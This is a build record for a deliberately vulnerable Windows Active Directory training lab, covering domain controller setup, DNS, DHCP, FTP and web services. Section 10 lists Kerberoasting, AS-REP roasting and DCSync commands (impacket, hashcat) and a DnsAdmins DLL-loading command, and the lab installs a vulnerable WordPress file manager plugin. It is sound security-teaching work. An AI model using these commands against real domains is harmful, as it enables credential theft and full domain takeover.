# Windows AD VM, Phase 1: Stable AD DS/DNS Baseline (Design and Build Record)

## Status

Phase 1 is complete on the Windows Server 2019 domain controller `uow-csf-dc` at `192.168.144.200`, for the domain `uow-csf.internal`. This document began as a design proposal and has since become the build record for that completed Phase 1 baseline. The design rationale and manual build sequence are retained as historical build documentation, while the validated results record the completed master state.

Everything in this document was executed manually by the project owner and verified from real command output. Nothing was run by an assistant, and no verification claim here is inferred rather than observed.

Phase 2, the deliberate vulnerability layer, is now substantially built. Kerberoasting (`svc-web`), AS-REP roasting (`helpdesk01`), and DCSync domain replication rights abuse (`backup.operator`) have all been built and validated on the master DC, see `e-18`/`e-19`/`r-21`/`e-21`, with DCSync as the Windows Phase 2 capstone. The `DnsAdmins`-abuse technique has been dropped from the current lab: reconnaissance was workable, but no clean Kali-native student exploitation path could be validated. Section 10 retains the design/testing notes for reference.

This revises the earlier `claude_w-01-windows-ad-baseline-design.md`. That document is background only and is not authoritative where it conflicts with the decisions below, in particular its Server Core and WordPress conclusions, which are not current.

## Current build status

- Clean base installation complete: Windows Server 2019 Standard Evaluation, Desktop Experience, VMware Tools installed, host/guest copy-paste confirmed working. Network discovery not enabled.
- Snapshot at that point: `cav-csf-windows-01-clean-server2019-vmtools` (Windows Server 2019 + VMware Tools only).
- Static IP, hostname rename, AD DS/DNS roles and domain promotion: all done and validated, see the next section.
- OU, user and group scaffolding: built, matching section 3 exactly.
- Deliberate vulnerabilities: substantially built. Kerberoasting on `svc-web`, AS-REP roasting on `helpdesk01`, and DCSync domain replication rights abuse on `backup.operator` are built and validated, see `e-18`/`e-19`/`r-21`/`e-21`, with DCSync as the Windows Phase 2 capstone; `DnsAdmins` abuse has been dropped from the current lab (no clean Kali-native student exploitation path was validated). Website component: built and validated, a lightweight static IIS intranet at `uow-intranet.uow-csf.internal` (section 5, `r-22`). A second web service, WordPress on IIS, is also built and validated at `uow-news.uow-csf.internal` (section 15).
- FTP service surface: built and validated. Anonymous, read-only IIS FTP (`Microsoft ftpd`, TCP 21) on the DC, see section 14 and `r-23`. Reconnaissance-only, not an exploit path.
- Master reproduction at `192.168.144.200` is complete; sections 7 to 9 are retained as the completed build sequence and validation record.

## Phase 1 AD DS/DNS baseline: passed

Validated following the build steps and checkpoints in this document.

Confirmed:

- Logged in as domain admin: `uowcsf\administrator`
- Hostname correct: `uow-csf-dc`
- Domain correct: `uow-csf.internal`
- NetBIOS name correct: `UOWCSF`
- FSMO roles on `uow-csf-dc.uow-csf.internal`
- LDAP and Kerberos SRV records resolve correctly
- DNS resolves the DC to its own address
- Core services running: `ADWS`, `DNS`, `Kdc`, `Netlogon`, `DFSR`
- `SYSVOL` and `NETLOGON` shares present and confirmed via `net share`
- `nltest /dsgetdc` returns correct DC, address, domain/forest names, and full expected role flags
- Checkpoint A (no AD roles): 767 MB available
- Checkpoint B (AD DS/DNS running idle): 659 MB available, roughly 1.36 GB used, under the 1.7 GB threshold, AD DS/DNS added notably less overhead than the section-level rough estimate

Known notes:

- External DNS/root hints fail in `dcdiag /test:DNS` because the VM is isolated on host-only networking, expected and not a defect.
- `DFSREvent` reports recent historical DFSR startup warnings (dcdiag checks a 24-hour log window, not current state), but current SYSVOL readiness passes and the DFSR service is running.
- `repadmin /replsummary` returns no rows, there are no replication partners to report on a single-DC forest, this is expected rather than a failure.
- One transient Spooler OOM event was logged during the pre-AD-role boot window, worth watching if it recurs, not treated as a Phase 1 blocker.

Master reproduction (`192.168.144.200`) is complete.

### Confirmed carry-over items for eventual master reproduction

Not to be actioned yet, recorded here so they aren't lost between now and the master build:

- NetBIOS name: `UOWCSF` (not `UOW-CSF`)
- Use a single-line `Install-ADDSForest` command (backtick line continuation avoided due to fragility)
- Internal DNS success is what matters for validation; external root hints/forwarder failure in `dcdiag /test:DNS` is expected and correct on the isolated host-only network, not a defect to chase
- `DFSREvent` may report historical startup warnings within its 24-hour log window; treat `SysVolCheck` passing, `SYSVOL`/`NETLOGON` shares present, `DFSR`/`ADWS`/`DNS`/`Kdc`/`Netlogon` services running, and `LocatorCheck` passing as the actual current-state evidence, not the `DFSREvent` log-window result on its own

### Validation progress

- AD DS/DNS promotion: verified (`whoami`, `Get-ADDomain`, service status, shares, `nltest`, DNS/SRV resolution, `dcdiag /test:SysVolCheck` all passed cleanly)
- Basic OU/group/user scaffolding (section 3): done, matches the confirmed design exactly (5 OUs, 8 users, 5 groups, 4 populated memberships)
- Power/lock-timeout settings: applied
- Windows 7 and Windows 10 client domain join: confirmed working
- Normal domain user login, tested end to end from a client: confirmed. Windows 10 client (`Win10`) joined to `uow-csf.internal`, logged in as `uowcsf\analyst` (Phase 1 baseline account), DNS correctly resolved to `192.168.144.200` via domain join, no manual DNS override needed
- DHCP is now built and validated on the DC, see section 13. The Windows 10 test client referenced above remains statically addressed at `192.168.144.237` (`DHCP Enabled: No`); DHCP is available for other clients via the scope in section 13.
- Linux-to-DC integration is now confirmed: `cav-csf-linux` has joined `uow-csf.internal` successfully via `realmd`/`sssd`, using the dedicated `svc-linux-auth` service account. Domain login and home-directory auto-creation have been confirmed.
- Low-privilege domain-join account `dcjoin` is now built and validated: delegated Computer-object create/delete rights on `OU=Computers,OU=UOW-CSF` only, default computer container redirected there via `redircmp`, confirmed with a Windows 10 client join (`WIN10-2`) landing in the correct OU.

### Power/lock-timeout settings: decided, keep

Based on prior experience with the old 2008 server, where default power/lock timeouts were a recurring annoyance for students, these settings are kept as a permanent part of the build:

```powershell
powercfg /change monitor-timeout-ac 0
powercfg /change standby-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change standby-timeout-dc 0
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutSecs /t REG_DWORD /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
```

Applied consistently across the build. The `HKCU` lines are per-user and need re-running for any additional account added later. Worth doing early in the build sequence (right after promotion or before OU/user creation), since it's independent of AD DS/DNS and easy to forget later.

## Current decisions (baseline for this document)

| Item | Value |
|---|---|
| Windows edition | Windows Server 2019 Standard, evaluation media |
| Install type | Desktop Experience (Server Core is a fallback only, see section 12) |
| VMware VM name | `cav-csf-windows` |
| Windows hostname | `uow-csf-dc` (confirmed) |
| FQDN | `uow-csf-dc.uow-csf.internal` |
| Domain | `uow-csf.internal` |
| Static IP | `192.168.144.200` |
| RAM target | 2 GB |
| CPU target | 1 to 2 vCPU |
| Network | Same isolated host-only lab segment as `cav-csf-linux` (`192.168.144.100`) and Kali |
| Phase 1 scope | AD DS and DNS only, stable baseline |
| AD CS | Deferred to Phase 3 |
| Deliberate vulnerabilities | None in Phase 1, deferred to Phase 2 |
| Website component | Static IIS intranet built (section 5); WordPress/IIS service also built (section 15) |

## Resource constraint (governs everything below)

Desktop Experience is the current install target, but it is materially heavier than Server Core at the same 2 GB ceiling, so the memory budget in Phase 1 is genuinely tight rather than comfortable.

### Measured decision, not an assumed budget

Desktop Experience is kept as the first attempt, but whether it is viable at 2 GB is a question to be answered by measurement after a clean install, not assumed from rough component sizing in advance. The test is staged in two checkpoints so a bad decision is not locked in before AD DS/DNS is even installed:

**Checkpoint A, before any AD role is installed.** After the static IP, DNS-to-self and hostname rename are done and the VM has rebooted, log in and take a quick look: Task Manager or `Get-Counter '\Memory\Available MBytes'` for a single practical reading, plus a general sense of whether the desktop feels responsive at 2 GB. This is a fast go/no-go check, not a benchmarking exercise.

- If memory use is consistently above roughly 1.7 GB used, or the VM is visibly unstable or unusable, stop and rebuild using Server Core before installing any AD role.
- If the VM is usable, continue straight to installing AD DS/DNS.

**Checkpoint B, after AD DS/DNS promotion.** Same quick observation, now with AD DS, DNS and Netlogon running idle. This is the figure referenced in sections 6 and 9.

Do not add IIS, WordPress, or any other heavier component (and AD CS is out of scope for Phase 1 regardless) until the AD DS/DNS baseline itself has cleared Checkpoint B. Adding a website before this baseline is measured would make it impossible to tell whether a later resource problem comes from AD DS/DNS or from the website stack.

Disk: Microsoft's stated minimum for Server 2019 install media is around 32 GB. A workable modest target for this VM is **40 GB** thin-provisioned, giving the OS and AD DS/DNS roles some working headroom without over-allocating on constrained lab hardware.

## 1. VM role and network assumptions

`cav-csf-windows` is a Windows Server 2019 domain controller, deployed in VMware Workstation alongside `cav-csf-linux` and the university Kali attacker VM.

- **Network segment.** Same `192.168.144.0/24` lab subnet as the Linux VM, not a separate isolated AD segment.
- **Static IP.** `192.168.144.200`. The Linux master is also now static at `192.168.144.100`; the DC's stable address is required for DNS, SRV records and Kerberos.
- **VM sizing.** 2 GB RAM, 1 to 2 vCPU, 40 GB thin-provisioned disk, Desktop Experience install.

## 2. Domain and hostname configuration

- Hostname: `uow-csf-dc` (confirmed)
- Domain (FQDN): `uow-csf.internal`
- NetBIOS name: `UOWCSF` (no hyphen, avoids relying on NetBIOS's stricter/older character-set support for punctuation)
- Forest/domain functional level: Windows Server 2016 (the ceiling for a Server 2019-only forest; 2019 does not introduce a higher functional level)
- Static IP (`192.168.144.200`) with DNS pointed at itself (loopback or its own static address), both before and after promotion
- VMware Tools time sync should be disabled on the DC once promoted, since the DC becomes the authoritative time source for the domain, and fighting with host time sync causes Kerberos clock-skew issues (default tolerance is 5 minutes)
- Desktop Experience gives you the normal GUI administration path (Server Manager, ADUC, DNS Manager) alongside PowerShell, so no Server-Core-specific administration workflow is needed for Phase 1 while this remains the install type

## 3. Initial AD users and groups

Phase 1 has moved from a single artificial test account to a small, realistic baseline directory. This began as Phase 1 scaffolding, not Phase 2 vulnerability content, and Phase 2 has since deliberately added specific vulnerable properties or relationships on top of it: an SPN on `svc-web` for Kerberoasting (`e-18`), `DoesNotRequirePreAuth` on `helpdesk01` for AS-REP roasting (`e-19`), and DCSync replication rights on `backup.operator` (`r-21`/`e-21`). The remaining candidate weaknesses not yet added include:

- passwords or clues in description fields
- ACL misconfigurations beyond the DCSync grant already applied to `backup.operator`
- risky group nesting
- SMB signing changes
- web/intranet credential leakage

Until any of the above is deliberately added to a specific account or group, its presence in the directory is baseline scaffolding, not a vulnerability.

- OU structure (built):
  - `OU=UOW-CSF`
    - `Users`
    - `Groups`
    - `Service Accounts`
    - `Computers`
- Accounts built, all in `OU=Users,OU=UOW-CSF` except `svc-web` (`OU=Service Accounts,OU=UOW-CSF`):
  - `analyst` (Security Analyst)
  - `mpatel` (Maya Patel)
  - `jreed` (Jordan Reed)
  - `skhan` (Sara Khan)
  - `helpdesk01` (Helpdesk Operator)
  - `svc-web` (Web Service)
  - `backup.operator` (Backup Operator)
  - `dcjoin` (Domain Join Account)
- Groups built, all in `OU=Groups,OU=UOW-CSF`:
  - `Lab-Students`, members: `analyst`, `mpatel`, `jreed`, `skhan`
  - `IT-Helpdesk`, members: `helpdesk01`
  - `Web-Services`, members: `svc-web`
  - `Backup-Operators-Lab`, members: `backup.operator`
  - `Staff-Admin`, unpopulated placeholder
- An SPN has been applied to `svc-web` (`e-18`), `DoesNotRequirePreAuth` to `helpdesk01` (`e-19`), and DCSync replication rights to `backup.operator` (`r-21`/`e-21`). No description-field content and no group nesting beyond flat membership have been applied to any account; `backup.operator` does carry the deliberate DCSync ACL grant noted above. Naming (`IT-Helpdesk`, `Web-Services`, `Backup-Operators-Lab`) anticipated which accounts/groups Phase 2 would attach weaknesses to, and the three built weaknesses above confirm that naming; the remaining candidate weaknesses are not yet present.

`dcjoin` (`OU=Users,OU=UOW-CSF`) is a low-privilege domain-join account: it replaces `Administrator` for joining lab Windows clients to `uow-csf.internal`. It has been delegated Create/Delete Computer object rights on `OU=Computers,OU=UOW-CSF` only (Delegation of Control Wizard, General category, Create All Child Objects/Delete All Child Objects scoped to Computer objects), and the domain's default computer container has been redirected to that OU:

```powershell
redircmp "OU=Computers,OU=UOW-CSF,DC=uow-csf,DC=internal"
```

so a standard client join places the computer object there without needing an explicit OU parameter. Verified end to end: a Windows 10 test client (`WIN10-2`) joined using `dcjoin` credentials and landed at `CN=WIN10-2,OU=Computers,OU=UOW-CSF,DC=uow-csf,DC=internal`. `dcjoin` carries no group membership beyond `Domain Users` and is not a member of `Domain Admins`, `Enterprise Admins`, or `Administrators`.

### Password provisioning (confirmed plan)

Phase 1 baseline account password convention: `CavLab2026!`. To be revised in Phase 2 during vulnerability design.

This is a deliberate Phase 1 build/testing convention, not the final vulnerability design, not an accidental weakness, and not a blocker for the master baseline. It keeps the baseline reproducible and keeps client-login validation simple.

Phase 2 will explicitly revise the account/password model. At that stage, selected accounts may receive different passwords, weak passwords, reused passwords, password-policy behaviour, or other credential conditions, depending on the intended attack paths, and recorded/included in the dictionary/wordlist used at that point.

Phase 2 credential rule: the Phase 1 shared password convention may remain only where an account is being used as a low-privilege bootstrap or validation account. Any account that is itself the target of a Phase 2 attack path must receive a deliberately designed credential condition for that activity, such as a crackable service-account password, disabled pre-authentication, controlled password reuse, or scoped delegated rights.
## 4. DNS records and Linux integration points

- AD-integrated primary forward lookup zone: `uow-csf.internal`, auto-populated with SRV records (`_ldap._tcp`, `_kerberos._tcp`, `_kerberos._udp`, `_gc._tcp`, etc.) by DCPromo
- Reverse lookup zone: optional but recommended for troubleshooting
- Linux integration point: this assumption has changed. The original design noted that the Linux VM does not need to resolve AD names for its own normal operation, which is no longer true now that it is domain-joined via `realmd`/`sssd`. SSSD requires the AD SRV records to locate the DC
- Consequence, tested and accepted: the Linux VM's own BIND9 instance is also authoritative for `uow-csf.internal`, so the two zones overlap. This is deliberate rather than a fault. The Linux VM resolves its own zone independently, and all five web application platforms were confirmed working with this VM powered off, which is the normal state outside the two modules that use both machines. See `ad-integration.md`
- For Kali, pointing at `192.168.144.200` for DNS or using a static hosts entry remains the intended approach for AD-focused exercises, rather than making the DC the default resolver for the whole lab network
- Whether the DC forwards external queries anywhere (for Windows Update or feature installation during the build) is an open decision, see section 12

## 5. Windows-hosted intranet: built and validated

Agreed: the site's job is a reconnaissance and initial-access bridge into the AD environment (staff names/usernames matching the naming convention above, department names matching AD groups, internal hostnames, service account references, breadcrumbs toward `uow-csf-dc.uow-csf.internal`), not a general OWASP-style playground duplicating the Linux VM's WebGoat/Juice Shop/Security Shepherd coverage.

Decided and built: the lightweight IIS/custom intranet, built using the Phase 2 AD objects it references (users, groups, hostnames, the `svc-web` service account and SPN from `e-18`), so its clues are accurate rather than placeholder text. It runs at `uow-intranet.uow-csf.internal` on `uow-csf-dc` (`192.168.144.200`); see `r-22` for the reconnaissance write-up. The candidates considered were:

- **Lightweight IIS/custom intranet or staff/service-desk portal — chosen and built.** Static content, IIS role only, no database engine required. Lowest resource cost of the candidates, and easiest to control precisely for planted clues. Its application pool identity is tied to the existing `svc-web` account, giving that account's SPN (`e-18`) a genuine running service behind it.
- **WordPress (IIS + PHP via FastCGI + MariaDB, tuned down) — initially deferred, later built as a separate service.** Familiar CMS with a large deliberately-vulnerable-plugin ecosystem; the heavier resource footprint (PHP-FPM/FastCGI plus a database engine) wasn't justified for the initial baseline, so the static intranet was chosen and built first as the AD reconnaissance bridge. WordPress was subsequently also built on the Windows DC as its own separate site, `uow-news.uow-csf.internal` (section 15); it does not replace the static intranet, and runs under its own `UOW-CSF-WP` application pool using `ApplicationPoolIdentity`, separate from `svc-web` and from any AD account.
- **Other lightweight Windows-compatible option** — not pursued, superseded by the built static intranet.

Build timing: built after the Phase 1 baseline was stable and the Phase 2 AD misconfiguration design existed, as planned.

## 6. Health checks for confirming the DC is working

Conceptual checklist, exact commands and expected output are in sections 8 and 9:

- AD DS and DNS services running without startup errors
- Directory Service, DNS Server and System event logs clear of AD-related errors
- DNS resolving the DC's own A record and the standard AD SRV records
- Time service healthy
- Expected AD service ports visible from Kali, matching a normal DC fingerprint
- Memory headroom under the 2 GB target confirmed at both Checkpoint A (before any AD role) and Checkpoint B (after AD DS/DNS promotion), this is the measured Desktop Experience vs Server Core decision point (see sections above and 12)

## 7. Manual build steps

Executed and validated on the master Windows VM at `192.168.144.200`. Retained as the completed build sequence for the Phase 1 baseline.

1. Configure static IP `192.168.144.200`, subnet mask, gateway.
2. Configure preferred DNS as `192.168.144.200` (itself).
3. Rename the computer to `uow-csf-dc` (Server Manager, or `Rename-Computer`).
4. Reboot.
5. **Checkpoint A.** After logging back in, with no AD role installed, take a quick memory/responsiveness reading (Task Manager or a single `Get-Counter '\Memory\Available MBytes'`).
6. If memory use is consistently above roughly 1.7 GB used, or the VM is visibly unstable or unusable, stop and rebuild as Server Core.
7. If the VM is usable, continue.
8. Install the Active Directory Domain Services and DNS roles (Server Manager, Add Roles and Features, or `Install-WindowsFeature AD-Domain-Services,DNS -IncludeManagementTools`).
9. Promote to a new forest: domain `uow-csf.internal`, forest/domain functional level Windows Server 2016.
10. Reboot.
11. Run the AD DS/DNS health checks in sections 8 to 9, including **Checkpoint B** (repeat the quick memory/responsiveness reading now that AD DS/DNS are running idle).
12. Disable VMware Tools time sync on this VM specifically, once promoted.
13. Create the OU structure and Phase 1 accounts described in section 3.
14. Take a VMware snapshot once the baseline is confirmed healthy. Confirm the snapshot naming convention with the existing Linux VM checkpoint style before naming it (see section 12).

## 8. Manual test commands

Run on `uow-csf-dc` unless stated otherwise.

```powershell
dcdiag /v
```

```powershell
w32tm /query /status
```

```powershell
Resolve-DnsName uow-csf-dc.uow-csf.internal
```

```powershell
Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.uow-csf.internal
Resolve-DnsName -Type SRV _kerberos._tcp.uow-csf.internal
```

```powershell
Get-Service ADWS,DNS,Kdc,Netlogon | Select-Object Name,Status
```

```powershell
Get-Counter '\Memory\Available MBytes'
```

From Kali, against `192.168.144.200`:

```bash
nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV 192.168.144.200
```

## 9. Expected outputs from those checks

- `dcdiag /v`: every test line ends `passed test ...`. Any `failed test` line needs investigating before proceeding, do not treat the DC as baseline-ready until this is clean.
- `w32tm /query /status`: shows a `Source` line; on the DC itself this is typically `Local CMOS Clock` unless an external NTP source has been configured (see section 12).
- `Resolve-DnsName uow-csf-dc.uow-csf.internal`: returns an `A` record with `IPAddress 192.168.144.200`.
- SRV lookups: each returns at least one SRV record pointing at `uow-csf-dc.uow-csf.internal` on the expected port (389 for LDAP, 88 for Kerberos).
- `Get-Service`: all four listed services show `Running`. `Kdc` and `Netlogon` not running usually indicates promotion did not complete cleanly.
- `Get-Counter '\Memory\Available MBytes'`: a quick practical reading at both Checkpoint A and Checkpoint B (section 7, build steps), not a sampled benchmark. This is the key Desktop Experience vs Server Core decision input, compare against the threshold in section 12.
- `nmap` from Kali: expect open ports on 53 (domain), 88 (kerberos-sec), 135 (msrpc), 139/445 (SMB), 389/636 (ldap/ldaps), 464 (kpasswd), 3268/3269 (Global Catalog). Version detection should identify Microsoft DNS and a Windows RPC/SMB stack consistent with Server 2019. Anything missing from this set indicates a role or firewall issue to resolve before moving to Phase 2.

## 10. Reproducible exploit/walkthrough instructions for later phases

This section records both completed and dropped Phase 2 techniques. Kerberoasting, AS-REP roasting, and DCSync domain replication rights abuse have now been built and validated against the master DC, see `e-18`, `e-19`, and `r-21`/`e-21`. `DnsAdmins` abuse has been dropped from Phase 2: the reconnaissance half (identifying group membership) was workable, but no clean Kali-native student exploitation path could be validated, so the technique is not included in the current lab. Each intended vulnerability must continue to be validated empirically against the real lab before it is documented as complete.

**Kerberoasting** — built and validated against `svc-web` (registered SPN, crackable password), see `e-18`. The commands below are retained as the general technique reference:

```bash
impacket-GetUserSPNs uow-csf.internal/<domain-user> -dc-ip 192.168.144.200 -request
```
Expect one or more `$krb5tgs$` hashes for accounts carrying an SPN, then offline cracking with `hashcat -m 13100`.

**AS-REP Roasting** — built and validated against `helpdesk01` (`DoesNotRequirePreAuth` set), see `e-19`. The commands below are retained as the general technique reference:

```bash
impacket-GetNPUsers uow-csf.internal/ -usersfile <userlist> -dc-ip 192.168.144.200 -no-pass
```
Expect a `$krb5asrep$` hash for any account with pre-auth disabled, cracked with `hashcat -m 18200`.

**DnsAdmins abuse** — dropped from the current lab; a Phase 2 account placed in the `DnsAdmins` group can be identified via reconnaissance (an authenticated LDAP query for the group's membership, tested successfully), but no clean Kali-native student exploitation path could be validated. The intended technique, from that account, would have been:

```cmd
dnscmd uow-csf-dc /config /serverlevelplugindll \\<attacker-share>\<malicious.dll>
```
followed by restarting the DNS service to load the DLL as SYSTEM. This ran into two practical blockers during testing: a RemoteRegistry-based route (`impacket-reg`) was denied, and the Windows-client route depends on `dnscmd`/RSAT tooling not present by default. Combined with the real blast-radius risk on a shared lab network (arbitrary code as SYSTEM on the DC), the technique is dropped rather than carried forward as parked work; the notes above are retained for reference only.

**DCSync** — built and validated against `backup.operator`, granted `DS-Replication-Get-Changes`/`DS-Replication-Get-Changes-All` directly on the domain object with no corresponding administrative group membership, see `r-21`/`e-21`. Reconnaissance uses `bloodhound-python`'s LDAP-based collection (parsed directly from its JSON output, no GUI required); the credential is confirmed via a routine `nxc` wordlist spray; exploitation:

```bash
impacket-secretsdump uow-csf.internal/backup.operator@192.168.144.200
```
NTLM hashes and Kerberos keys recovered for every domain account including `krbtgt`, confirming full domain compromise. This is the Windows Phase 2 capstone.

DCSync's write-up now exists (`r-21`/`e-21`), following the existing `.md` documentation structure (Summary, Lab Dependencies, Reconnaissance, Exploitation, Evidence, Outcome, Remediation, Teaching Notes). `DnsAdmins` has been dropped from Phase 2 and will not receive a numbered write-up.

## 11. What to defer until the vulnerability phase

- AD CS entirely, no CA installed in Phase 1
- Any heavy Windows server role (SQL Server, Exchange-like services)
- Weak/default or reused passwords
- Passwords or clues in user description fields
- Over-privileged users/groups and further ACL misconfigurations beyond the DCSync grant already applied to `backup.operator` (`r-21`/`e-21`)
- SMB signing weakening
- Landing page / login banner text for the Windows VM

## 12. Open decisions before implementation

- **Hostname.** `uow-csf-dc` is confirmed. Once promoted to a domain controller, renaming should be avoided unless there is a very strong reason.
- **Desktop Experience fallback threshold (agreed wording).**
  - If Windows Server 2019 Desktop Experience with no AD roles installed idles consistently above roughly 1.7 GB RAM used, or becomes visibly unstable/unusable at the 2 GB allocation, rebuild using Server Core before proceeding (Checkpoint A).
  - If it remains usable after clean install, continue to the AD DS/DNS baseline and check again after promotion (Checkpoint B).
  - This is a quick practical observation at each checkpoint, not a separate benchmarking exercise.
- **Website implementation.** Settled: both were ultimately built rather than one replacing the other. The static IIS intranet was built first (section 5) as the AD reconnaissance bridge; a separate WordPress/IIS service was added afterward (section 15) as its own independent web service, not a replacement.
- **Internet access during build.** Needed for Windows Update and feature installation. If enabled temporarily, should it be removed before the VM is treated as lab-ready?
- **Licensing.** Windows Server 2019 evaluation media carries a 180-day evaluation period. Confirm whether eval-with-rearm is acceptable given the VM is discarded/rebuilt per activity, or whether the university's licensing channel should be used instead.
- **Snapshot/versioning naming.** Still unreconciled, but now retrospectively: the clean-install snapshot was already taken as `cav-csf-windows-01-clean-server2019-vmtools`, which does not match the Linux convention (`CAV-CSF-01-VMware-Clean`). Decide whether to align the two conventions and rename, or accept the divergence and document it, before further Windows snapshots accumulate under the current style.
- **DNS authority for `uow-csf.internal`.** Settled, recorded here only so it is not reopened. The Linux VM's BIND9 instance and this DC's AD-integrated zone both hold the zone; this is accepted as a deliberate split, validated by testing the web applications with this VM powered off. The Linux VM is optimised for standalone operation because that is how it is used in all but two modules. See `ad-integration.md`.
- **Time source.** Should Kali and the Linux VM share an NTP source with the DC? Relevant once cross-machine Kerberos activities (section 10) are added, where clock skew can silently break exploitation attempts.
- **DnsAdmins scope.** Settled: DCSync is built and validated as the Windows Phase 2 capstone (`r-21`/`e-21`). `DnsAdmins` is dropped from the current lab, given its SYSTEM-level blast radius on a shared lab network and the lack of a validated Kali-native student exploitation path (reconnaissance alone was workable); recorded here only so it is not reopened.

## 13. DHCP configuration (built and validated)

DHCP is now built and validated on the master DC, `uow-csf-dc` (`192.168.144.200`), for `uow-csf.internal`. This is infrastructure baseline work, not a Phase 2 vulnerability, and has no `r-`/`e-` write-up.

**Scope design:**

| Item | Value |
|---|---|
| Scope ID | `192.168.144.0` |
| Lease range | `192.168.144.105`–`192.168.144.125` |
| Subnet mask | `255.255.255.0` |
| Lease duration | 1 day |
| DNS server (Option 6) | `192.168.144.200` |
| DNS domain name (Option 15) | `uow-csf.internal` |
| Router (Option 3) | Not set; the segment is host-only with no real gateway |

The range avoids the fixed addresses on the segment (`.100` Linux master, `.200` the DC itself, `.237` the static-addressed Windows 10 test client) and sits below the VMware host-only virtual network's own default DHCP range (`.128`–`.254`) for this VMnet.

**Dependency: VMware's own host-only DHCP service must be disabled.** VMware Workstation's Virtual Network Editor can independently run "Use local DHCP service to distribute IP address to VMs" for the same VMnet. If left enabled, it answers client DHCP requests faster than the DC (a host-level process versus a DHCP server running inside a VM) and wins the address-assignment race regardless of whether the two ranges overlap, so non-overlapping ranges alone do not make the DC authoritative. This was confirmed empirically: with VMware's local DHCP left on, a domain-joined client received an address outside the DC's scope and the generic domain suffix `localdomain` (VMware's built-in default) rather than `uow-csf.internal`. Disabling VMware's local DHCP service for this VMnet is a prerequisite for the DC's scope to actually service clients.

**Verification:**

```powershell
Get-DhcpServerInDC
Get-DhcpServerv4Scope
Get-DhcpServerv4OptionValue -ScopeId 192.168.144.0
Get-DhcpServerv4Lease -ScopeId 192.168.144.0
```

A domain-joined Windows client configured for automatic addressing (`ipconfig /release` then `/renew`) receives an address in `192.168.144.105`–`192.168.144.125`, DNS server `192.168.144.200`, and DNS suffix `uow-csf.internal`, confirming the DC is the sole DHCP server servicing the segment.

## 14. FTP service discovery (built and validated)

An anonymous, read-only IIS FTP service is now built and validated on the master DC, `uow-csf-dc` (`192.168.144.200`), for `uow-csf.internal`. This is a reconnaissance-only service-surface addition, not an exploit path; see `r-23` for the full reconnaissance write-up.

**Service design:**

| Item | Value |
|---|---|
| Site | `UOW-CSF-FTP` |
| Physical path | `C:\inetpub\ftproot` |
| Binding | `192.168.144.200:21`, no SSL |
| Authentication | Anonymous only |
| Authorization | All users, Read only |
| Content | Seven static IT Support/reference files (password-reset contact guidance, department share paths, a new-starter checklist, department contacts, and related reference material) |

**Verification:**

```bash
nmap -p 21 -sV 192.168.144.200
curl -v ftp://192.168.144.200/ --user anonymous:anonymous
```

Anonymous login succeeds (`230 User logged in`), and directory listing confirms all seven files. See `r-23-windows-service-discovery.md` for the full evidence and teaching notes.


## 15. WordPress/IIS service (built and validated)

A second Windows-hosted web service is now built and validated on the master DC, `uow-csf-dc` (`192.168.144.200`), for `uow-csf.internal`, alongside the static intranet (section 5) and IIS FTP (section 14): a WordPress installation on IIS, running PHP via FastCGI against a local MariaDB instance.

**Service design:**

| Item | Value |
|---|---|
| Site | `UOW-CSF-WP` |
| Host header | `uow-news.uow-csf.internal` |
| Physical path | `C:\inetpub\wwwroot\wp-news` |
| Application pool | `UOW-CSF-WP`, default `ApplicationPoolIdentity` |
| PHP | 8.1.31 (NTS, x64), IIS FastCGI |
| Database engine | MariaDB 10.6.22, bound to `127.0.0.1` only |
| Database | `wp_news` |
| Database user | `wp_news_user`@`127.0.0.1` |
| WordPress version | 6.6.2 |
| Site title | UOW-CSF News |
| Admin username | `wp.editor` |
| Admin email | `web.services@uow-csf.internal` |
| Installed plugin | `wp-file-manager` (from `wp-file-manager.6.0.zip`) |

Both the application pool identity and the database user are local to this service: `ApplicationPoolIdentity` is a per-pool virtual account with no domain identity, and `wp_news_user` is a MariaDB account with no relationship to any Windows or AD account. Neither `svc-web` nor any other Phase 2 AD account is used by this service.

**Verification:**

```powershell
Invoke-WebRequest -Uri "http://uow-news.uow-csf.internal/" -UseBasicParsing
netstat -ano | findstr ":3306"
```

The site returns `200` with PHP-rendered content; `netstat` confirms MariaDB listening on `127.0.0.1:3306` only, not `0.0.0.0`. The WP File Manager exploitation write-up for this service is `e-22` (WP File Manager arbitrary file upload). A dedicated reconnaissance write-up remains future work, pending `r-24`.
